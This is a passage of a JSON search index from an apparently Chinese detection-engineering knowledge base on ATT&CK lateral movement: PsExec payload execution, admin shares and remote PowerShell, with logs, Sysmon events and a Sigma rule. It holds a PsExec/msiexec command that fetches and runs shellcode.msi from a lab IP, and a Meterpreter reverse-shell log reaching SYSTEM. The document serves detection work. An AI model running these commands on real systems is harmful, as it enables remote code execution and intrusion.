shellcode.msi","title":"\u751f\u6210payload"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_6","text":"\u6ce8\u610f\uff1a\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi","title":"\u9776\u673a\u6267\u884c"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > getpid Current pid: 2352","title":"\u53cd\u5f39shell"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_7","text":"windows \u5b89\u5168\u65e5\u5fd7 EventID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xe84 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe EventID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xfcc \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\PSEXESVC.exe EVentID\uff1a5140 \u7f51\u7edc\u4fe1\u606f: \u5bf9\u8c61\u7c7b\u578b: File \u6e90\u5730\u5740: fe80::719e:d312:648f:4884 \u6e90\u7aef\u53e3: 49369 \u5171\u4eab\u4fe1\u606f: \u5171\u4eab\u540d: \\\\*\\IPC$ EventID\uff1a5145 \u7f51\u7edc\u4fe1\u606f: \u5bf9\u8c61\u7c7b\u578b: File \u6e90\u5730\u5740: fe80::719e:d312:648f:4884 \u6e90\u7aef\u53e3: 49369 \u5171\u4eab\u4fe1\u606f: \u5171\u4eab\u540d\u79f0: \\\\*\\IPC$ \u5171\u4eab\u8def\u5f84: \u76f8\u5bf9\u76ee\u6807\u540d\u79f0: PSEXESVC SYSMON\u65e5\u5fd7 EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.237 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001} ProcessId: 3716 Image: C:\\Users\\12306Br0\\Desktop\\PSTools\\PsExec.exe FileVersion: 2.2 Description: Execute processes remotely Product: Sysinternals PsExec Company: Sysinternals - www.sysinternals.com OriginalFileName: psexec.c CommandLine: PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi CurrentDirectory: C:\\Users\\12306Br0\\Desktop\\PSTools\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600} LogonId: 0x6e1ea TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095 ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001} ParentProcessId: 3492 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.284 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001} ProcessId: 4044 Image: C:\\Windows\\PSEXESVC.exe FileVersion: 2.2 Description: PsExec Service Product: Sysinternals PsExec Company: Sysinternals OriginalFileName: psexesvc.exe CommandLine: C:\\Windows\\PSEXESVC.exe CurrentDirectory: C:\\Windows\\system32\\ User: NT AUTHORITY\\SYSTEM LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000} LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7 ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000} ParentProcessId: 496 ParentImage: C:\\Windows\\System32\\services.exe ParentCommandLine: C:\\Windows\\system32\\services.exe EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 15:09:29.440 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001} ProcessId: 1916 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: \"msiexec.exe\" /q /i http://192.168.126.146/shellcode.msi CurrentDirectory: C:\\Windows\\system32\\ User: NT AUTHORITY\\SYSTEM LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000} LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001} ParentProcessId: 4044 ParentImage: C:\\Windows\\PSEXESVC.exe ParentCommandLine: C:\\Windows\\PSEXESVC.exe \u7531\u4e8esysmon\u914d\u7f6e\u95ee\u9898\uff0c\u53ea\u5bf9\u8fdb\u7a0b\u521b\u5efa\u884c\u4e3a\u8fdb\u884c\u76d1\u63a7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636ePsExec\u7279\u5f81\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_9","text":"MITRE-ATT&CK-T1021-002 https://attack.mitre.org/techniques/T1021/002/ \u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload https://blog.csdn.net/ws13129/article/details/89879771","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/","text":"T1021-002-windows-\u7ba1\u7406\u5458\u5171\u4eab \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002 Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 Netflow \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u867d\u7136\u53ef\u80fd\u6709\u66f4\u591a\u57fa\u4e8e\u4e3b\u673a\u65e5\u5fd7\u7684\u65b9\u6cd5\u53ef\u4ee5\u68c0\u6d4b\u4e3b\u673a\u4e0a\u7684\u8be6\u7ec6SMB\u4e8b\u4ef6\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u63d0\u53d6\u68c0\u6d4b\u5230\u5b83\u4eec\u3002\u4f7f\u7528\u6b63\u786e\u7684\u534f\u8bae\u89e3\u6790\u5668\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u7aef\u53e3445\u6d41\u91cf\uff0c\u751a\u81f3\u53ef\u4ee5\u68c0\u7d22\u6587\u4ef6\u8def\u5f84\uff08\u76f8\u5bf9\u4e8e\u5171\u4eab\uff09\u3002 flow = search Flow:Message smb_events = filter flow where (dest_port == \"445\" and protocol == \"smb\") smb_events.file_name = smb_events.proto_info.file_name output smb_write \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u57fa\u4e8e\u8fd9\u6837\u7684\u68c0\u6d4b\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u8bef\u62a5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1021-002 https://attack.mitre.org/techniques/T1021/002/","title":"T1021-002-windows-\u7ba1\u7406\u5458\u5171\u4eab"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#t1021-002-windows-","text":"","title":"T1021-002-windows-\u7ba1\u7406\u5458\u5171\u4eab"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002 Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_2","text":"Netflow","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_5","text":"\u867d\u7136\u53ef\u80fd\u6709\u66f4\u591a\u57fa\u4e8e\u4e3b\u673a\u65e5\u5fd7\u7684\u65b9\u6cd5\u53ef\u4ee5\u68c0\u6d4b\u4e3b\u673a\u4e0a\u7684\u8be6\u7ec6SMB\u4e8b\u4ef6\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u63d0\u53d6\u68c0\u6d4b\u5230\u5b83\u4eec\u3002\u4f7f\u7528\u6b63\u786e\u7684\u534f\u8bae\u89e3\u6790\u5668\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u7aef\u53e3445\u6d41\u91cf\uff0c\u751a\u81f3\u53ef\u4ee5\u68c0\u7d22\u6587\u4ef6\u8def\u5f84\uff08\u76f8\u5bf9\u4e8e\u5171\u4eab\uff09\u3002 flow = search Flow:Message smb_events = filter flow where (dest_port == \"445\" and protocol == \"smb\") smb_events.file_name = smb_events.proto_info.file_name output smb_write \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u57fa\u4e8e\u8fd9\u6837\u7684\u68c0\u6d4b\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u8bef\u62a5\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_6","text":"MITRE-ATT&CK-T1021-002 https://attack.mitre.org/techniques/T1021/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/","text":"T1021-006-win-\u8fdc\u7a0bpowershell\u4f1a\u8bdd \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u201c \u6709\u6548\u5e10\u6237\u201d\u4f7f\u7528Windows\u8fdc\u7a0b\u7ba1\u7406\uff08WinRM\uff09\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 WinRM\u662fWindows\u670d\u52a1\u548c\u534f\u8bae\u7684\u540d\u79f0\uff0c\u8be5\u534f\u8bae\u5141\u8bb8\u7528\u6237\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff08\u4f8b\u5982\uff0c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4fee\u6539\u670d\u52a1\uff09\u3002\u53ef\u4ee5\u4f7f\u7528winrm\u547d\u4ee4\u6216\u4efb\u4f55\u6570\u91cf\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\uff09\u6765\u8c03\u7528\u5b83\u3002 \u6d4b\u8bd5\u6848\u4f8b \u672c\u6d4b\u8bd5\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfpowershell Enter-PSSession -ComputerName \\<RemoteHost>\u521b\u5efa\u4e00\u4e2a\u8fdc\u7a0bPowerShell\u4f1a\u8bdd\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 OR windows powershell\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff0c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5b50\u7236\u8fdb\u7a0b\u7b49\u4fe1\u606f\uff08\u5bf9\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u8f83\u9ad8\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: win_\u8fdc\u7a0bpowershell\u4f1a\u8bdd description: windows server 2016 tags: T1021-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\dllhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\wsmprovhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: 'C:\\Windows\\system32\\wsmprovhost.exe -Embedding' #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 timeframe: last 2s condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1021-006 https://attack.mitre.org/techniques/T1021/006/ winrm service https://www.cnblogs.com/gamewyd/p/6805595.html","title":"T1021-006-win-\u8fdc\u7a0bpowershell\u4f1a\u8bdd"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#t1021-006-win-powershell","text":"","title":"T1021-006-win-\u8fdc\u7a0bpowershell\u4f1a\u8bdd"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u201c \u6709\u6548\u5e10\u6237\u201d\u4f7f\u7528Windows\u8fdc\u7a0b\u7ba1\u7406\uff08WinRM\uff09\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002 WinRM\u662fWindows\u670d\u52a1\u548c\u534f\u8bae\u7684\u540d\u79f0\uff0c\u8be5\u534f\u8bae\u5141\u8bb8\u7528\u6237\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff08\u4f8b\u5982\uff0c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4fee\u6539\u670d\u52a1\uff09\u3002\u53ef\u4ee5\u4f7f\u7528winrm\u547d\u4ee4\u6216\u4efb\u4f55\u6570\u91cf\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\uff09\u6765\u8c03\u7528\u5b83\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_1","text":"\u672c\u6d4b\u8bd5\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfpowershell Enter-PSSession -ComputerName \\<RemoteHost>\u521b\u5efa\u4e00\u4e2a\u8fdc\u7a0bPowerShell\u4f1a\u8bdd\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7 OR windows powershell\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_4","text":"\u4e8b\u4ef6ID\uff0c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5b50\u7236\u8fdb\u7a0b\u7b49\u4fe1\u606f\uff08\u5bf9\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u8f83\u9ad8\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#sigma","text":"title: win_\u8fdc\u7a0bpowershell\u4f1a\u8bdd description: windows server 2016 tags: T1021-006 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\dllhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\wsmprovhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: 'C:\\Windows\\system32\\wsmprovhost.exe -Embedding' #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 timeframe: last 2s condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_7","text":"MITRE-ATT&CK-T1021-006 https://attack.mitre.org/techniques/T1021/006/ winrm service https://www.cnblogs.com/gamewyd/p/6805595.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/","text":"T1210-win-\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 